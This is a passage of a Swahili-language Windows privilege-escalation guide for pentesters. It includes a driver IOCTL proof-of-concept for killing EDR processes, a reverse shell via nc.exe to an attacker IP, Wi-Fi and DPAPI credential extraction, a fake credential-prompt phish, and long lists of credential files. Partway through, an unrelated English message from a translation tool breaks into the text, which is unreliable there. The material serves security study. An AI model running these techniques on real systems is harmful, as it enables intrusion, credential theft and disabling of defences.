### Endesha wakati wa kuanza

**Angalia kama unaweza kuandika juu ya registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** ukurasa **ufuatao** ili ujifunze zaidi kuhusu maeneo ya kuvutia ya **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Tafuta madereva ya pande za tatu **yasiyo ya kawaida/yanayo udhaifu**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ikiwa driver inaonyesha primitive ya arbitrary kernel read/write (ya kawaida katika IOCTL handlers zilizo mbovu kubuniwa), unaweza kupata escalation kwa kuiba token ya SYSTEM moja kwa moja kutoka kwenye memory ya kernel. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Kutumia kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye object za kifaa (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object yao na SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila bendera hii, secure DACL haitekelezwi wakati device inafunguliwa kupitia path inayojumuisha sehemu ya ziada, ikiruhusu mtumiaji asiye na mamlaka kupata handle kwa kutumia namespace path kama:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

Mara mtumiaji anapoweza kufungua device, privileged IOCTLs exposed by the driver zinaweza kutumiwa vibaya kwa LPE na kuingilia. Mifano ya uwezo uliotambuliwa katika mazingira halisi:
- Rejesha full-access handles kwa arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, ikijumuisha Protected Process/Light (PP/PPL), ikiruhusu AV/EDR kill kutoka user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mikakati ya kupunguza hatari kwa waendelezaji
- Daima weka FILE_DEVICE_SECURE_OPEN unapotengeneza device objects zinazokusudiwa kufungwa na DACL.
- Thibitisha muktadha wa mwombaji kwa operesheni zenye mamlaka za juu. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kumalizika kwa process au kurudishwa kwa handle.
- Weka vizuizi kwa IOCTLs (access masks, METHOD_*, input validation) na zingatia modeli za brokered badala ya ruhusa za moja kwa moja za kernel.

Mapendekezo ya utambuzi kwa walinzi
- Fuatilia ufunguzi katika user-mode wa majina ya device yenye shaka (e.g., \\ .\\amsdk*) na mfuatano maalum wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza orodha ya kuzuia madereva hatarishi ya Microsoft (HVCI/WDAC/Smart App Control) na udumishe orodha zako za kuruhusu/kukataliwa.

## PATH DLL Hijacking

Kama una **write permissions ndani ya folda iliyopo kwenye PATH** unaweza hijack DLL inayopakiwa na process na **escalate privileges**.

Angalia ruhusa za folda zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Sehemu zilizoshirikiwa
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizo hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Miunganisho ya Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Angalia kwa ajili ya **huduma zilizozuiwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Njia
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

Zaidi[ amri za uchunguzi wa mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Faili ya binari `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata root user unaweza kusikiliza kwenye port yoyote (mara ya kwanza utakapotumia `nc.exe` kusikiliza kwenye port itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Vyeti vya Windows

### Winlogon Vyeti
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault huhifadhi credentials za watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** can **log in the users automaticall**y. Mwanzoni, inaweza kuonekana kama watumiaji wanaweza kuhifadhi Facebook credentials, Twitter credentials, Gmail credentials n.k., ili wao waingia moja kwa moja kupitia browser. Lakini sivyo.

Windows Vault huhifadhi credentials ambazo Windows inaweza kuingia watumiaji moja kwa moja, ambayo inamaanisha kwamba programu yoyote ya **Windows application that needs credentials to access a resource** (server au website) **can make use of this Credential Manager** & Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila mara.

Isipokuwa programu zinashirikiana na Credential Manager, sidhani zinaweza kutumia credentials za rasilimali fulani. Kwa hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa njia fulani **communicate with the credential manager and request the credentials for that resource** kutoka vault ya uhifadhi ya chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhi kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` kwa chaguo la `/savecred` ili kutumia cheti za uthibitisho zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti iliyotolewa ya credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** inatoa njia ya usimbaji wa data wa namna simetriki, inayotumika hasa ndani ya mfumo wa Windows kwa usimbaji simetriki wa funguo binafsi za asymmetric. Usimbaji huu unategemea siri ya mtumiaji au ya mfumo kuongeza kwa kiasi kikubwa entropi.

**DPAPI inaruhusu usimbaji wa funguo kwa kutumia funguo simetriki inayotokana na siri za kuingia za mtumiaji**. Katika mazingira ya usimbaji wa mfumo, inatumia siri za uthibitishaji za domain ya mfumo.

Funguo za RSA za mtumiaji zilizofichwa, zikitumika DPAPI, zinahifadhiwa katika saraka ya %APPDATA%\Microsoft\Protect\{SID}, ambapo {SID} inaonyesha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Funguo ya DPAPI, iliyoko pamoja na funguo kuu inayolinda funguo binafsi za mtumiaji katika faili hiyo hiyo**, kwa kawaida inaundwa na bajti 64 za data nasibu. (Ni muhimu kutambua kuwa ufikiaji wa saraka hii umezuiliwa, ukizuia kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` na hoja zinazofaa (`/pvk` au `/rpc`) ili kuiondoa usimbaji wake.

Faili za **credentials zilizolindwa na master password** kwa kawaida ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kuifumbua.\
Unaweza **kutoa masterkeys nyingi za DPAPI** kutoka **memory** kwa kutumia module `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vyeti vya PowerShell

**Vyeti vya PowerShell** hutumika mara nyingi kwa ajili ya **scripting** na kazi za otomatiki kama njia ya kuhifadhi vyeti vilivosimbwa kwa urahisi. Vyeti hivyo zinalindwa kwa kutumia **DPAPI**, jambo ambalo kwa kawaida linamaanisha vinaweza kufumbuliwa tu na mtumiaji yule yule kwenye kompyuta ile ile zilipotengenezwa.

Ili **kufumbua** vyeti vya PS kutoka kwenye faili inayoiweka unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP iliyohifadhiwa

Unaweza kuzipata katika `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri zilizotumika hivi karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Uthibitisho wa Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module na `/masterkey` inayofaa ili **decrypt any .rdg files**\ Unaweza **extract many DPAPI masterkeys** kutoka kwenye memory kwa Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia programu ya StickyNotes kwenye workstations za Windows kuhifadhi nywila na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii iko katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inastahili kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kuwa ili recover passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha kwa High Integrity level.**\
**AppCmd.exe** iko katika `%systemroot%\system32\inetsrv\` directory.\
Ikiwa faili hii ipo basi inawezekana kwamba baadhi ya **credentials** zimewekwa na zinaweza kuwa **recovered**.

Msimbo huu ulitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` inapatikana .\
Wasakinishaji huendeshwa kwa **SYSTEM privileges**, wengi wao wako hatarini kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Mafaili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys katika rejista

SSH private keys zinaweza kuhifadhiwa ndani ya funguo za rejista `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia ikiwa kuna kitu cha kuvutia huko:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata faili yoyote ndani ya njia hiyo, kuna uwezekano mkubwa ni ufunguo wa SSH uliohifadhiwa. Imehifadhiwa ikiwa imefichwa kwa usimbaji lakini inaweza kufunguliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haiko inayoendesha na ungependa ianze moja kwa moja wakati wa boot, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda ssh keys, kuziongeza kwa `ssh-add` na kuingia kwa ssh kwenye mashine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon hakuonyesha matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Faili zisizoangaliwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Chelezo za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vyeti vya Wingu
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### Cached GPP Pasword

Kipengele kilikuwa kinapatikana kilichoruhusu kusambaza akaunti za local administrator zilizobinafsishwa kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na mapungufu makubwa ya usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, zilikuwa zinapatikana kwa mtumiaji yeyote wa domain. Pili, nywila ndani ya GPP hizi, zilizofichwa kwa AES256 kwa kutumia default key iliyotangazwa hadharani, zinaweza kufichuliwa (decrypted) na mtumiaji yeyote aliyethibitishwa. Hili lilikuwa tishio kubwa kwa kuwa lingeweza kumruhusu mtumiaji kupata haki za juu.

Ili kupunguza hatari hii, ilitengenezwa function inayoscan faili za GPP zilizo locally cached zenye field ya "cpassword" isiyo tupu. Kufanikiwa kupata faili kama hiyo, function inadecrypt nywila na kurudisha custom PowerShell object. Object hii inajumuisha maelezo kuhusu GPP na mahali pa faili, ikisaidia kutambua na kurekebisha udhaifu huu wa usalama.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili ku-decrypt cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config na taarifa za kuingia:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN maelezo ya kuingia
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba credentials

Unaweza kila wakati **kuomba mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzifahamu (zingatia kwamba **kuomba** mteja moja kwa moja kwa **credentials** ni **hatari** sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na maelezo ya kuingia**

Faili zilizojulikana ambazo wakati fulani zilikuwa na **nywila** kwa **maandishi wazi** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your files. Please either:

- Paste the content of src/windows-hardening/windows-local-privilege-escalation/README.md here, or
- Provide the list of "proposed files" (and their contents) you want searched/translated, or
- Give me a way to access the repository (URL or file upload).

Once you provide the file content(s), I'll translate the relevant English text to Swahili, preserving all markdown/html/tags/paths as requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials katika RecycleBin

Unapaswa pia kuangalia Bin kutafuta credentials ndani yake

Kwa **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya rejista

**Vifunguo vingine vinavyowezekana vya rejista vilivyo na credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya vivinjari

Unapaswa kukagua dbs ambapo nywila kutoka kwa **Chrome or Firefox** zinahifadhiwa.\
Pia angalia history, bookmarks na favourites za vivinjari kwa sababu labda baadhi ya **passwords are** zimetunzwa huko.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu mawasiliano kati ya vipengele vya programu vilivyotengenezwa kwa lugha tofauti. Kila sehemu ya COM inatambulika kupitia class ID (CLSID) na kila sehemu huonyesha kazi kupitia moja au zaidi ya interfaces, zinazotambulika kupitia interface IDs (IIDs).

COM classes and interfaces zimetangazwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** kwa mtiririko huo. Registry hii inaundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry ndogo **InProcServer32** ambayo ina default value inayoonyesha kuelekea DLL na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kwa msingi, ikiwa unaweza kuoverwrite yoyote ya DLLs zinazotakiwa kutekelezwa, unaweza escalate privileges ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
